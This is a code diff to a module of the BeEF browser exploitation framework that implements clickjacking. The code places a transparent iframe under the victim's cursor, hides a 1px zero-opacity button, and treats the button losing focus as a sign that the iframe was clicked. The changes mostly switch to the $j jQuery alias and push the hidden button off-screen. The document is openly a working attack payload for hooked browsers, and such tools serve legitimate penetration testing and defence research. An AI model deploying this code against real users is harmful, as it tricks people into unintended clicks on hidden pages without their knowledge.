@@ -67,7 +67,7 @@ beef.execute(function() {
 		var inner = $j.extend(true, {'border':'none', 'position':'absolute', 'width':'2000px', 'height':'10000px'}, stylesInner);
 
 		var containerDiv = $j('<div id="' + elems.outerFrame + '"></div>').css(container).prependTo('body');
-		var containerDiv = $j('<input id="' + elems.btn + '" type="button" value="invisible" style="width:1px;height:1px;opacity:0;alpha(opacity=0)" />').appendTo('body');
+		var containerDiv = $j('<input id="' + elems.btn + '" type="button" value="invisible" style="width:1px;height:1px;opacity:0;alpha(opacity=0);margin-left:-200px" />').appendTo('body');
 
 		var innerIframe = $j('<iframe id="' + elems.innerFrame + '" scrolling="no" />').attr(params).css(inner).load(callback).prependTo('#' + elems.outerFrame);
 
@@ -77,16 +77,16 @@ beef.execute(function() {
 	function step1(){
 		var btnSelector = "#" + elems.btn;
 		var outerSelector = "#" + elems.outerFrame;
-		var btnObj = $(btnSelector);
-		var outerObj = $(outerSelector);
+		var btnObj = $j(btnSelector);
+		var outerObj = $j(outerSelector);
 
-		$(window).mousemove(function(e) {
-			$(outerObj).css('top', e.pageY);
-			$(outerObj).css('left', e.pageX);
+		$j("body").mousemove(function(e) {
+			$j(outerObj).css('top', e.pageY);
+			$j(outerObj).css('left', e.pageX);
 		});
 
-		$(btnObj).focus();
-		$(btnObj).focusout(function() {
+		$j(btnObj).focus();
+		$j(btnObj).focusout(function() {
 			cjLog("Iframe clicked");
 			iframeClicked();
 		});
@@ -105,8 +105,8 @@ beef.execute(function() {
 
 		setTimeout(function(){
 			var btnSelector = "#" + elems.btn;
-			var btnObj = $(btnSelector);
-			$(btnObj).focus();
+			var btnObj = $j(btnSelector);
+			$j(btnObj).focus();
 
 			//check if there are any more actions to perform
 			try {
@@ -122,15 +122,15 @@ beef.execute(function() {
 
 	function updateIframePosition(){
 		var innerSelector = "#" + elems.innerFrame;
-		var innerObj = $(innerSelector);
-		$(innerObj).css('top', innerPos.top + 'px');
-		$(innerObj).css('left', innerPos.left + 'px');
+		var innerObj = $j(innerSelector);
+		$j(innerObj).css('top', innerPos.top + 'px');
+		$j(innerObj).css('left', innerPos.left + 'px');
 	}
 
 	//Remove outerFrame and persistent button
 	function removeAll(){
-		$("#" + elems.outerFrame).remove();
-		$("#" + elems.btn).remove();
+		$j("#" + elems.outerFrame).remove();
+		$j("#" + elems.btn).remove();
 	}
 
 	function cjLog(msg){
